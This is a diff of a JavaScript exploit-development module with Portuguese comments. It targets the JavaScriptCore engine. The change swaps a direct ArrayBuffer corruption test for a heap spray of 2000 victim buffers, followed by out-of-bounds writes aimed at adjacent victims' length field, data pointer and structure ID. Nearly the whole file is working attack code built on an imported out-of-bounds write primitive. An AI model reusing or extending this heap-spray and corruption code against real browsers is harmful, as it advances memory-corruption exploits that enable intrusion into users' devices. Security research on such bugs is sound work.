@@ -3,21 +3,19 @@ import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real, // Alvo de corrupção e sondagem
+    oob_array_buffer_real, // O buffer onde a escrita OOB acontece
     oob_write_absolute,
-    clearOOBEnvironment
+    clearOOBEnvironment,
+    getBaseOffsetInDV,
+    getOOBAllocationSize
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// Esta função não usará mais as sondas toJSON, mas fará inspeção direta.
-// objectToInspect: o oob_array_buffer_real após a tentativa de corrupção
-// expectedOriginalSize: tamanho do oob_array_buffer_real ANTES da corrupção
-// corruptionValueWritten: o valor que foi escrito
-// corruptionOffsetWritten: o offset onde foi escrito
-export function inspectArrayBufferState(objectToInspect, expectedOriginalSize, corruptionValueWritten, corruptionOffsetWritten) {
+// Função de inspeção direta (reutilizada da iteração anterior)
+export function inspectArrayBufferState(victimBuffer, expectedVictimSize, corruptionDetails) {
     const FNAME_INSPECT = "inspectArrayBufferState";
     let report = {
-        inspected_object_type: Object.prototype.toString.call(objectToInspect),
+        inspected_object_type: Object.prototype.toString.call(victimBuffer),
         is_still_array_buffer: false,
         current_byteLength: "N/A",
         byteLength_changed: false,
@@ -26,176 +24,171 @@ export function inspectArrayBufferState(objectToInspect, expectedOriginalSize, c
         notes: ""
     };
 
-    logS3(`  [${FNAME_INSPECT}] Inspecionando estado do ArrayBuffer após corrupção...`, "info");
-    logS3(`    Valor escrito: ${isAdvancedInt64Object(corruptionValueWritten) ? corruptionValueWritten.toString(true) : toHex(corruptionValueWritten)} no offset ${toHex(corruptionOffsetWritten)}`, "info");
-
+    logS3(`    [${FNAME_INSPECT}] Inspecionando vítima. Corrupção tentada: ${isAdvancedInt64Object(corruptionDetails.value) ? corruptionDetails.value.toString(true) : toHex(corruptionDetails.value)} @ ${toHex(corruptionDetails.offset_in_oob_buffer)}`, "info");
 
     if (report.inspected_object_type !== "[object ArrayBuffer]") {
-        report.notes = `Objeto não é mais um ArrayBuffer! Tipo: ${report.inspected_object_type}`;
-        logS3(`    CRÍTICO: ${report.notes}`, "critical", FNAME_INSPECT);
+        report.notes = `Vítima não é mais um ArrayBuffer! Tipo: ${report.inspected_object_type}`;
+        logS3(`      CRÍTICO (Inspeção): ${report.notes}`, "critical", FNAME_INSPECT);
         return report;
     }
     report.is_still_array_buffer = true;
 
     try {
-        report.current_byteLength = objectToInspect.byteLength;
-        if (report.current_byteLength !== expectedOriginalSize) {
+        report.current_byteLength = victimBuffer.byteLength;
+        if (report.current_byteLength !== expectedVictimSize) {
             report.byteLength_changed = true;
-            report.notes += `byteLength alterado de ${expectedOriginalSize} para ${report.current_byteLength}. `;
-            logS3(`    ANOMALIA: ${report.notes}`, "critical", FNAME_INSPECT);
+            report.notes += `byteLength alterado de ${expectedVictimSize} para ${report.current_byteLength}. `;
+            logS3(`      ANOMALIA (Inspeção): ${report.notes}`, "critical", FNAME_INSPECT);
         } else {
-            logS3(`    byteLength permanece ${report.current_byteLength} (esperado).`, "good", FNAME_INSPECT);
+            // logS3(`    [${FNAME_INSPECT}] byteLength permanece ${report.current_byteLength}.`, "info");
         }
 
-        // Tentar operações de DataView
-        // Usar um tamanho pequeno e seguro para teste, especialmente se byteLength for enorme/corrompido
         const testDvLength = Math.min(typeof report.current_byteLength === 'number' ? report.current_byteLength : 0, 16);
         if (testDvLength >= 4) {
-            const dv = new DataView(objectToInspect, 0, testDvLength);
-            const writeVal = 0xABCD;
+            const dv = new DataView(victimBuffer, 0, testDvLength);
+            const writeVal = 0xABCDDCBA; // Valor diferente para não confundir com outros testes
             dv.setUint32(0, writeVal, true);
             if (dv.getUint32(0, true) === writeVal) {
                 report.dataview_ops_ok = true;
-                logS3(`    Operações DataView (R/W em pequena área) OK.`, "good", FNAME_INSPECT);
             } else {
                 report.dataview_error = "DataView R/W falhou (valor incorreto)";
                 report.notes += "DataView R/W falhou (valor incorreto). ";
-                logS3(`    CRÍTICO: ${report.dataview_error}`, "critical", FNAME_INSPECT);
+                logS3(`      CRÍTICO (Inspeção): ${report.dataview_error}`, "critical", FNAME_INSPECT);
             }
         } else {
             report.dataview_error = `byteLength (${report.current_byteLength}) muito pequeno para teste DataView.`;
-            report.notes += `byteLength (${report.current_byteLength}) muito pequeno para teste DataView. `;
-            // Não necessariamente crítico se o byteLength foi intencionalmente zerado.
-             logS3(`    AVISO: ${report.dataview_error}`, "warn", FNAME_INSPECT);
+            // Não necessariamente crítico se byteLength foi intencionalmente zerado pela corrupção.
+            if (report.current_byteLength !== 0) { // Só é um problema real se não for 0
+                 logS3(`      AVISO (Inspeção): ${report.dataview_error}`, "warn", FNAME_INSPECT);
+            }
         }
-
     } catch (e) {
         report.dataview_error = `Exceção durante inspeção: ${e.name} - ${e.message}`;
         report.notes += `Exceção: ${e.message}. `;
-        logS3(`    CRÍTICO: Exceção durante inspeção: ${e.name} - ${e.message}`, "critical", FNAME_INSPECT);
+        logS3(`      CRÍTICO (Inspeção): Exceção durante inspeção: ${e.name} - ${e.message}`, "critical", FNAME_INSPECT);
         console.error(e);
     }
     return report;
 }
 
-// Parâmetros:
-// corruption_offset_in_oob_ab: offset absoluto DENTRO do oob_array_buffer_real onde a escrita ocorre
-// value_to_write: valor a ser escrito
-// size_to_write: tamanho da escrita (1, 2, 4, ou 8 para AdvancedInt64)
-export async function executeDirectCorruptionAndInspect(corruption_offset_in_oob_ab, value_to_write, size_to_write) {
-    const FNAME_TEST = "executeDirectCorruptionAndInspect";
-    logS3(`--- Sub-Teste: Corrupção Direta e Inspeção ---`, "subtest", FNAME_TEST);
-    logS3(`  Alvo da Corrupção e Inspeção: oob_array_buffer_real`, "info", FNAME_TEST);
-    logS3(`  Tentando escrever ${isAdvancedInt64Object(value_to_write) ? value_to_write.toString(true) : toHex(value_to_write)} (tamanho ${size_to_write}) em offset abs ${toHex(corruption_offset_in_oob_ab)}`, "info", FNAME_TEST);
 
-    let result_report = null;
-    let problem_detected_in_subtest = false;
-
-    // oob_array_buffer_real deve existir (criado por runAllInstabilityTestsOnVictimAB)
-    if (!oob_array_buffer_real) {
-        logS3("CRÍTICO: oob_array_buffer_real não existe no início do sub-teste!", "critical", FNAME_TEST);
-        return { final_verdict_is_problem: true, report: null, error: "oob_array_buffer_real missing" };
-    }
-    const original_size = oob_array_buffer_real.byteLength;
-
-    if (!oob_write_absolute(corruption_offset_in_oob_ab, value_to_write, size_to_write)) {
-        logS3("   Falha ao escrever valor de corrupção.", "error", FNAME_TEST);
-        return { final_verdict_is_problem: true, report: null, error: "oob_write_absolute failed" };
-    }
-    logS3("   Valor de corrupção escrito com sucesso no oob_array_buffer_real.", "good", FNAME_TEST);
-    await PAUSE_S3(SHORT_PAUSE_S3); // Pausa para a escrita "assentar"
-
-    result_report = inspectArrayBufferState(oob_array_buffer_real, original_size, value_to_write, corruption_offset_in_oob_ab);
-
-    if (!result_report.is_still_array_buffer ||
-        result_report.byteLength_changed ||
-        !result_report.dataview_ops_ok || // Considerar falha de DV sempre um problema
-        (result_report.dataview_error && !result_report.dataview_error.includes("muito pequeno para teste DataView")) // Erros de DV que não sejam "muito pequeno"
-       ) {
-        problem_detected_in_subtest = true;
-    }
-    
-    if (problem_detected_in_subtest) {
-        logS3(`   PROBLEMA DETECTADO na inspeção após corrupção (${toHex(value_to_write)} @ ${toHex(corruption_offset_in_oob_ab)})`, "critical", FNAME_TEST);
-        logS3(`     Detalhes da Inspeção: ${JSON.stringify(result_report)}`, "critical", FNAME_TEST);
-        document.title = `PROBLEMA (${toHex(value_to_write)}@${toHex(corruption_offset_in_oob_ab)})`;
-    } else {
-        logS3(`   Inspeção completada sem problemas óbvios detectados.`, "good", FNAME_TEST);
-    }
-
-    logS3(`--- Sub-Teste Corrupção Direta CONCLUÍDO ---`, "subtest", FNAME_TEST);
-    return { final_verdict_is_problem: problem_detected_in_subtest, report: result_report, error: null };
-}
-
-
+// Nova função principal para Estratégia 2
 export async function runAllInstabilityTestsOnVictimAB() {
-    const FNAME_RUNNER = "runAllInstabilityTestsOnVictimAB";
-    logS3(`==== INICIANDO Teste de Corrupção Direta e Inspeção do oob_array_buffer_real ====`, "test", FNAME_RUNNER);
+    const FNAME_RUNNER = "runHeapSprayAndCorruptStrategy";
+    logS3(`==== INICIANDO Teste: Heap Spray + Corrupção de Vítima Adjacente ====`, "test", FNAME_RUNNER);
 
+    const victim_size = 64; // Tamanho de cada ArrayBuffer vítima pulverizado
+    const spray_count = 2000; // Número de vítimas a pulverizar
+    const sprayed_victims = [];
     let overall_problem_found = false;
 
-    // Offsets são relativos ao início do objeto JSArrayBuffer (assumindo que começa em 0 do buffer bruto)
+    // Offsets de escrita OOB DENTRO do oob_array_buffer_real.
+    // Estes devem tentar "vazar" para uma vítima adjacente.
+    // O oob_array_buffer_real tem (getBaseOffsetInDV() + getOOBAllocationSize() + 256) bytes.
+    // O oob_dataview_real (a "janela") começa em getBaseOffsetInDV() e tem getOOBAllocationSize() bytes.
+    // Queremos escrever perto do fim do oob_array_buffer_real.
+    const oobBufferTrueEndOffset = getBaseOffsetInDV() + getOOBAllocationSize() + 256;
+
+    // Parâmetros de corrupção: { nome, offset_no_oob_buffer, valor_escrita, tamanho_escrita }
+    // Os offsets são absolutos dentro do oob_array_buffer_real.
+    // Tentaremos atingir metadados de uma vítima que *poderia* estar após o oob_array_buffer_real.
+    // Se uma vítima está em X, seu m_impl é X + HEADER + 0x10, m_byteLength é X + HEADER + 0x18.
+    const JSCELL_HEADER_SIZE_GUESS = 8; // Ajuste conforme necessário (0, 8, 16)
+
     const corruption_params_to_try = [
-        { name: "Corromper m_byteLength para 0xFFFFFFFF",
-          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, // Ex: "0x18"
+        // Tentar atingir m_byteLength (0x18) de uma vítima adjacente
+        { name: "Corromper m_byteLength da vítima adjacente para 0xFFFFFFFF",
+          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16),
           value: 0xFFFFFFFF, size: 4 },
-        { name: "Corromper m_byteLength para 0 (zero)",
-          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START,
+        { name: "Corromper m_byteLength da vítima adjacente para 0",
+          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16),
           value: 0x00000000, size: 4 },
-        { name: "Corromper m_byteLength para 1024",
-          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START,
-          value: 1024, size: 4 },
-        { name: "Corromper m_byteLength para valor ENORME (requer escrita 64bit no offset certo)",
-          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, // Se byteLength for 64bit, este offset pode precisar ser diferente
-          value: new AdvancedInt64(0xFFFFFFFF, 0x7FFFFFFF), size: 8 }, // Exemplo de valor positivo enorme
-        { name: "Corromper ponteiro m_impl para NULL",
-          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, // Ex: "0x10"
+        { name: "Corromper m_byteLength da vítima adjacente para 256",
+          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16),
+          value: 256, size: 4 },
+        // Tentar atingir m_impl (0x10) de uma vítima adjacente
+        { name: "Corromper m_impl da vítima adjacente para NULL",
+          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16),
           value: new AdvancedInt64(0,0), size: 8},
-        { name: "Corromper ponteiro m_impl para valor inválido (BAD)",
-          offset_in_JSObject_hex: JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET,
+        { name: "Corromper m_impl da vítima adjacente para BAD",
+          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16),
           value: new AdvancedInt64(0xBADBAD00, 0xBADBAD00), size: 8},
-        // Adicionar um caso para Structure ID se você souber o offset e um ID de outro tipo
-        // { name: "Corromper StructureID para um ID de JSTypedArray",
-        //   offset_in_JSObject_hex: JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, // Ex: "0x00" (precisa ser relativo ao JSCell header)
-        //   value: ID_DE_JSTYPEDARRAY_CONHECIDO, size: 4 } // CUIDADO: Isso requer conhecimento preciso do StructureID
+        // Tentar uma escrita um pouco antes, para pegar o header da vítima
+         { name: "Corromper header da vítima adjacente (StructureID?)",
+          offset_in_oob_buffer: oobBufferTrueEndOffset + JSCELL_HEADER_SIZE_GUESS + parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16), // Ex: 0x00 ou 0x08
+          value: 0xDEADBEEF, size: 4 },
     ];
 
     for (const params of corruption_params_to_try) {
         logS3(`\n[${FNAME_RUNNER}] Testando Parâmetros de Corrupção: ${params.name}`, "test", FNAME_RUNNER);
+        logS3(`  Tentando escrever ${isAdvancedInt64Object(params.value) ? params.value.toString(true) : toHex(params.value)} (tam: ${params.size}) em offset ${toHex(params.offset_in_oob_buffer)} do oob_array_buffer_real`, "info", FNAME_RUNNER);
 
-        clearOOBEnvironment(); // Garante um oob_array_buffer_real "fresco"
+        // 1. Limpar e criar o buffer OOB principal
+        clearOOBEnvironment();
         if (!triggerOOB_primitive()) {
             logS3("Falha crítica ao criar oob_array_buffer_real. Abortando.", "critical", FNAME_RUNNER);
-            overall_problem_found = true; // Marcar como problema para evitar falso negativo
-            break;
+            overall_problem_found = true; break;
         }
-        // O oob_array_buffer_real agora existe.
+        logS3(`   oob_array_buffer_real criado/reutilizado. Tamanho total: ${oob_array_buffer_real.byteLength}`, "info", FNAME_RUNNER);
 
-        // ATENÇÃO: Suposição de que o objeto JSArrayBuffer (com seus metadados como m_byteLength)
-        // começa no offset 0 do buffer de dados brutos retornado por `new ArrayBuffer()`.
-        // Em um motor JS real, pode haver um `JSCell header` antes.
-        // Se houver um header de, por exemplo, 8 bytes, então `params.offset_in_JSObject_hex`
-        // precisaria ser somado a esses 8 bytes para obter o `actual_write_offset_in_raw_buffer`.
-        const JSCELL_HEADER_SIZE_GUESS = 8; // << AJUSTE ESTE VALOR SE VOCÊ SUSPEITAR DE UM HEADER
-        const actual_write_offset = JSCELL_HEADER_SIZE_GUESS + parseInt(params.offset_in_JSObject_hex, 16);
-
-        const test_result = await executeDirectCorruptionAndInspect(
-            actual_write_offset,
-            params.value,
-            params.size
-        );
-
-        if (test_result.final_verdict_is_problem) {
-            overall_problem_found = true;
+        // 2. Heap Spray das vítimas
+        sprayed_victims.length = 0; // Limpar array de vítimas anterior
+        logS3(`   Pulverizando ${spray_count} ArrayBuffers vítima de ${victim_size} bytes...`, "info", FNAME_RUNNER);
+        for (let i = 0; i < spray_count; i++) {
+            sprayed_victims.push(new ArrayBuffer(victim_size));
         }
-        await PAUSE_S3(MEDIUM_PAUSE_S3);
-    }
+        logS3(`   Pulverização concluída.`, "good", FNAME_RUNNER);
+        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para estabilização do heap
+
+        // 3. Realizar a escrita OOB no oob_array_buffer_real
+        if (!oob_write_absolute(params.offset_in_oob_buffer, params.value, params.size)) {
+            logS3("   Falha ao escrever valor de corrupção no oob_array_buffer_real.", "error", FNAME_RUNNER);
+            continue; // Próximo parâmetro de corrupção
+        }
+        logS3("   Valor de corrupção escrito no oob_array_buffer_real com sucesso.", "good", FNAME_RUNNER);
+        await PAUSE_S3(SHORT_PAUSE_S3);
+
+        // 4. Sondar um subconjunto das vítimas pulverizadas
+        logS3(`   Iniciando sondagem de ${Math.min(100, spray_count)} vítimas pulverizadas...`, "info", FNAME_RUNNER);
+        let problem_found_for_this_param = false;
+        const probe_sample_size = Math.min(100, spray_count); // Sondar até 100 vítimas
+        const probe_step = Math.max(1, Math.floor(spray_count / probe_sample_size));
+
+        for (let i = 0; i < spray_count; i += probe_step) {
+            if (i >= spray_count) break;
+            const victim_to_inspect = sprayed_victims[i];
+            // logS3(`    Sondando vítima pulverizada index ${i}...`, "info", FNAME_RUNNER);
+
+            const inspection_report = inspectArrayBufferState(
+                victim_to_inspect,
+                victim_size, // Tamanho original esperado da vítima
+                { value: params.value, offset_in_oob_buffer: params.offset_in_oob_buffer } // Detalhes da corrupção tentada
+            );
+
+            if (!inspection_report.is_still_array_buffer ||
+                inspection_report.byteLength_changed ||
+                !inspection_report.dataview_ops_ok ||
+                (inspection_report.dataview_error && !inspection_report.dataview_error.includes("muito pequeno"))) {
+                logS3(`    PROBLEMA DETECTADO na vítima pulverizada index ${i} (ID log implícito)!`, "critical", FNAME_RUNNER);
+                logS3(`      Detalhes da Inspeção: ${JSON.stringify(inspection_report)}`, "critical", FNAME_RUNNER);
+                document.title = `PROBLEMA Vítima Spray (${isAdvancedInt64Object(params.value) ? params.value.toString(true).substring(0,10) : toHex(params.value)} @ ${toHex(params.offset_in_oob_buffer)}) VítimaIdx ${i}`;
+                problem_found_for_this_param = true;
+                overall_problem_found = true;
+                break; // Para esta corrupção, achamos um problema, vamos para a próxima.
+            }
+        }
+        if (!problem_found_for_this_param) {
+            logS3(`   Nenhum problema óbvio detectado nas vítimas sondadas para estes params.`, "good", FNAME_RUNNER)
+        }
+         await PAUSE_S3(SHORT_PAUSE_S3); // Pausa entre diferentes parâmetros de corrupção
+    } // Fim do loop corruption_params_to_try
 
     if (overall_problem_found) {
-         logS3(`==== Teste de Corrupção Direta CONCLUÍDO: UM OU MAIS PROBLEMAS FORAM DETECTADOS. Verifique logs. ====`, "vuln", FNAME_RUNNER);
-         document.title = "PROBLEMA(S) DETECTADO(S) - Corrupção Direta AB";
+         logS3(`==== Teste Heap Spray CONCLUÍDO: UM OU MAIS PROBLEMAS FORAM DETECTADOS. Verifique logs. ====`, "vuln", FNAME_RUNNER);
+         document.title = "PROBLEMA(S) DETECTADO(S) - Heap Spray AB";
     } else {
-        logS3(`==== Teste de Corrupção Direta CONCLUÍDO: NENHUM PROBLEMA ÓBVIO DETECTADO. ====`, "good", FNAME_RUNNER);
+        logS3(`==== Teste Heap Spray CONCLUÍDO: NENHUM PROBLEMA ÓBVIO DETECTADO NAS VÍTIMAS SONDADAS. ====`, "good", FNAME_RUNNER);
     }
     clearOOBEnvironment(); // Limpeza final
+    sprayed_victims.length = 0; // Liberar referências
 }
